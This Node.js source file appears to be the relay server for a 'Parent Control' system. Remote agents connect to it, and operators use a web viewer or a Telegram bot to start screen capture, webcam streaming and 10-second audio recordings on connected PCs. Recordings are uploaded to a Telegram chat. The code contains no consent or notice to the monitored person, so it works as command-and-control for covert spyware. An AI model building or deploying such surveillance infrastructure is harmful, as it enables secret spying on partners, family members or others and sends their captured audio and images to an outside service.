import crypto from "node:crypto";
import http from "node:http";
import path from "node:path";
import { fileURLToPath } from "node:url";
import express from "express";
import { WebSocket, WebSocketServer } from "ws";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const PORT = Number(process.env.PORT || 8080);
const AGENT_TOKEN = process.env.AGENT_TOKEN || "change-agent-token";
const VIEWER_PASSWORD = process.env.VIEWER_PASSWORD || "change-viewer-password";
const BOT_TOKEN = process.env.BOT_TOKEN || "";
const ADMIN_CHAT_ID = String(process.env.ADMIN_CHAT_ID || "");

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });

const agents = new Map();
const viewers = new Set();
let telegramEnabled = false;
let telegramOffset = 0;

app.use(express.static(path.join(__dirname, "public")));

app.get("/health", (_req, res) => {
  res.json({ ok: true });
});

app.get("/api/status", (req, res) => {
  if (!safeEqual(String(req.query.password || ""), VIEWER_PASSWORD)) {
    res.status(403).json({ ok: false });
    return;
  }

  res.json({
    ok: true,
    devices: getDeviceList(),
    viewers: viewers.size
  });
});

server.on("upgrade", (req, socket, head) => {
  const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
  const type = url.pathname.replace("/", "");

  if (type === "agent") {
    if (!safeEqual(url.searchParams.get("token") || "", AGENT_TOKEN)) {
      socket.destroy();
      return;
    }
  } else if (type === "viewer") {
    if (!safeEqual(url.searchParams.get("password") || "", VIEWER_PASSWORD)) {
      socket.destroy();
      return;
    }
  } else {
    socket.destroy();
    return;
  }

  wss.handleUpgrade(req, socket, head, (ws) => {
    wss.emit("connection", ws, req, type, url);
  });
});

wss.on("connection", (ws, _req, type, url) => {
  if (type === "agent") {
    const deviceId = normalizeDeviceId(url.searchParams.get("device_id") || "home-pc");
    const deviceName = normalizeDeviceName(url.searchParams.get("device_name") || deviceId);
    const existing = agents.get(deviceId);

    if (existing?.ws && existing.ws.readyState === WebSocket.OPEN) {
      existing.ws.close();
    }

    const device = {
      id: deviceId,
      name: deviceName,
      ws,
      onlineAt: new Date().toISOString(),
      lastSeenAt: new Date().toISOString(),
      lastScreenFrame: existing?.lastScreenFrame || "",
      lastWebcamFrame: existing?.lastWebcamFrame || "",
      screen: false,
      webcam: false
    };

    agents.set(deviceId, device);
    broadcastStatus();
    notifyTelegram(`Միացավ՝ ${device.name}`);

    ws.on("message", (raw) => handleAgentMessage(deviceId, raw));
    ws.on("close", () => {
      const current = agents.get(deviceId);
      if (current?.ws === ws) {
        current.ws = null;
        current.screen = false;
        current.webcam = false;
        current.lastSeenAt = new Date().toISOString();
        broadcastStatus();
        notifyTelegram(`Անջատվեց՝ ${current.name}`);
      }
    });
    return;
  }

  viewers.add(ws);
  sendJson(ws, {
    type: "status",
    devices: getDeviceList(),
    viewers: viewers.size
  });
  for (const device of agents.values()) {
    if (device.lastScreenFrame) sendJson(ws, { type: "frame", deviceId: device.id, stream: "screen", data: device.lastScreenFrame });
    if (device.lastWebcamFrame) sendJson(ws, { type: "frame", deviceId: device.id, stream: "webcam", data: device.lastWebcamFrame });
  }

  ws.on("message", (raw) => handleViewerMessage(ws, raw));
  ws.on("close", () => {
    viewers.delete(ws);
    broadcastStatus();
  });
});

function handleAgentMessage(deviceId, raw) {
  const device = agents.get(deviceId);
  if (!device) return;

  let payload = null;
  try {
    payload = JSON.parse(String(raw));
  } catch {
    return;
  }

  device.lastSeenAt = new Date().toISOString();

  if (payload.type === "frame" && payload.stream && payload.data) {
    if (payload.stream === "screen") {
      device.lastScreenFrame = payload.data;
      device.screen = true;
    }
    if (payload.stream === "webcam") {
      device.lastWebcamFrame = payload.data;
      device.webcam = true;
    }
    broadcast({
      type: "frame",
      deviceId,
      stream: payload.stream,
      data: payload.data,
      ts: Date.now()
    });
    return;
  }

  if (payload.type === "audio" && payload.data) {
    sendTelegramAudio(device, payload);
    return;
  }

  if (payload.type === "agent_status") {
    device.screen = Boolean(payload.screen);
    device.webcam = Boolean(payload.webcam);
    broadcast({
      type: "agent_status",
      deviceId,
      message: String(payload.message || ""),
      screen: device.screen,
      webcam: device.webcam,
      ts: Date.now()
    });
    broadcastStatus();
  }
}

function handleViewerMessage(ws, raw) {
  let payload = null;
  try {
    payload = JSON.parse(String(raw));
  } catch {
    return;
  }

  if (payload.type !== "command") return;
  const ok = sendCommandToDevice(payload.deviceId, payload.command);
  if (!ok) {
    sendJson(ws, { type: "notice", level: "warn", message: "Գործակալը միացված չէ։" });
  }
}

function sendCommandToDevice(deviceId, command) {
  const allowed = new Set(["screen_start", "screen_stop", "webcam_start", "webcam_stop", "audio", "all_stop"]);
  if (!allowed.has(command)) return false;

  const target = pickDevice(deviceId);
  if (!target?.ws || target.ws.readyState !== WebSocket.OPEN) return false;

  sendJson(target.ws, { type: "command", command });
  return true;
}

function pickDevice(deviceId) {
  if (deviceId && agents.has(deviceId)) return agents.get(deviceId);
  for (const device of agents.values()) {
    if (device.ws && device.ws.readyState === WebSocket.OPEN) return device;
  }
  return null;
}

function getDeviceList() {
  return Array.from(agents.values()).map((device) => ({
    id: device.id,
    name: device.name,
    online: Boolean(device.ws && device.ws.readyState === WebSocket.OPEN),
    onlineAt: device.onlineAt,
    lastSeenAt: device.lastSeenAt,
    screen: device.screen,
    webcam: device.webcam,
    hasScreen: Boolean(device.lastScreenFrame),
    hasWebcam: Boolean(device.lastWebcamFrame)
  }));
}

function broadcast(payload) {
  for (const viewer of viewers) {
    sendJson(viewer, payload);
  }
}

function broadcastStatus() {
  broadcast({
    type: "status",
    devices: getDeviceList(),
    viewers: viewers.size
  });
}

function sendJson(ws, payload) {
  if (ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify(payload));
  }
}

function safeEqual(left, right) {
  const leftBytes = Buffer.from(String(left));
  const rightBytes = Buffer.from(String(right));
  if (leftBytes.length !== rightBytes.length) return false;
  return crypto.timingSafeEqual(leftBytes, rightBytes);
}

function normalizeDeviceId(value) {
  const clean = String(value || "")
    .toLowerCase()
    .replace(/[^a-z0-9_-]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 32);
  return clean || `pc-${crypto.randomBytes(4).toString("hex")}`;
}

function normalizeDeviceName(value) {
  return String(value || "Home PC").replace(/\s+/g, " ").trim().slice(0, 80) || "Home PC";
}

function setupTelegramBot() {
  if (!BOT_TOKEN || !ADMIN_CHAT_ID) return;
  telegramEnabled = true;
  telegramPollLoop().catch((error) => {
    console.error("Telegram bot failed:", error.message);
  });
  console.log("Telegram bot enabled");
}

async function telegramPollLoop() {
  while (telegramEnabled) {
    try {
      const result = await telegramApi("getUpdates", {
        offset: telegramOffset,
        timeout: 25,
        allowed_updates: ["message", "callback_query"]
      });
      if (result?.ok && Array.isArray(result.result)) {
        for (const update of result.result) {
          telegramOffset = Math.max(telegramOffset, update.update_id + 1);
          await handleTelegramUpdate(update);
        }
      }
    } catch (error) {
      console.error("Telegram polling error:", error.message);
      await delay(3000);
    }
  }
}

async function handleTelegramUpdate(update) {
  const message = update.message;
  if (message?.text === "/start") {
    if (!isAdminChat(message.chat.id)) return;
    await sendTelegramDeviceList(message.chat.id);
    return;
  }

  const query = update.callback_query;
  if (!query) return;

  if (!isAdminChat(query.message?.chat?.id)) {
    await answerTelegramCallback(query.id, "Մուտքը թույլատրված չէ։");
    return;
  }

  const data = String(query.data || "");
  if (data === "refresh") {
    await answerTelegramCallback(query.id, "Թարմացվում է։");
    await sendTelegramDeviceList(query.message.chat.id);
    return;
  }

  if (data.startsWith("device:")) {
    const deviceId = data.slice("device:".length);
    await answerTelegramCallback(query.id, "Ընտրված է։");
    await sendTelegramDeviceMenu(query.message.chat.id, deviceId);
    return;
  }

  if (data.startsWith("cmd:")) {
    const [, command, deviceId] = data.split(":");
    const ok = sendCommandToDevice(deviceId, command);
    await answerTelegramCallback(query.id, ok ? "Հրամանն ուղարկվեց։" : "Սարքը միացված չէ։");
  }
}

function isAdminChat(chatId) {
  return String(chatId) === ADMIN_CHAT_ID;
}

async function sendTelegramDeviceList(chatId) {
  const devices = getDeviceList();
  const keyboard = devices.map((device) => [{
    text: `${device.online ? "🟢" : "⚪"} ${device.name}`,
    callback_data: `device:${device.id}`
  }]);
  keyboard.push([{ text: "🔄 Թարմացնել", callback_data: "refresh" }]);

  await telegramApi("sendMessage", {
    chat_id: chatId,
    text: devices.length ? "Ընտրիր համակարգիչը։" : "Դեռ միացված համակարգիչ չկա։",
    reply_markup: { inline_keyboard: keyboard }
  });
}

async function sendTelegramDeviceMenu(chatId, deviceId) {
  const device = agents.get(deviceId);
  if (!device) {
    await telegramApi("sendMessage", { chat_id: chatId, text: "Սարքը չի գտնվել։" });
    return;
  }

  await telegramApi("sendMessage", {
    chat_id: chatId,
    text: `Սարք՝ ${device.name}`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔴 Էկրան", callback_data: `cmd:screen_start:${device.id}` }],
        [{ text: "📷 Վեբ տեսախցիկ", callback_data: `cmd:webcam_start:${device.id}` }],
        [{ text: "🎤 Ձայնագրել 10 վ", callback_data: `cmd:audio:${device.id}` }],
        [{ text: "⏸ Դադարեցնել", callback_data: `cmd:all_stop:${device.id}` }],
        [{ text: "⬅️ Սարքեր", callback_data: "refresh" }]
      ]
    }
  });
}

async function answerTelegramCallback(callbackQueryId, text) {
  await telegramApi("answerCallbackQuery", {
    callback_query_id: callbackQueryId,
    text
  });
}

function notifyTelegram(message) {
  if (!telegramEnabled || !ADMIN_CHAT_ID) return;
  telegramApi("sendMessage", {
    chat_id: ADMIN_CHAT_ID,
    text: message
  }).catch(() => {});
}

async function sendTelegramAudio(device, payload) {
  if (!telegramEnabled || !ADMIN_CHAT_ID) return;
  const audio = Buffer.from(String(payload.data || ""), "base64");
  const form = new FormData();
  form.append("chat_id", ADMIN_CHAT_ID);
  form.append("caption", `Ձայնագրություն՝ ${device.name}`);
  form.append("audio", new Blob([audio], { type: "audio/wav" }), payload.filename || `${device.id}.wav`);

  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
    method: "POST",
    body: form
  });
  if (!res.ok) {
    console.error("Telegram audio failed:", res.status, await res.text());
  }
}

async function telegramApi(method, body) {
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body)
  });
  if (!res.ok) {
    throw new Error(`${method} failed: ${res.status}`);
  }
  return res.json();
}

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

setupTelegramBot();

server.listen(PORT, () => {
  console.log(`Parent Control Relay: http://localhost:${PORT}`);
});
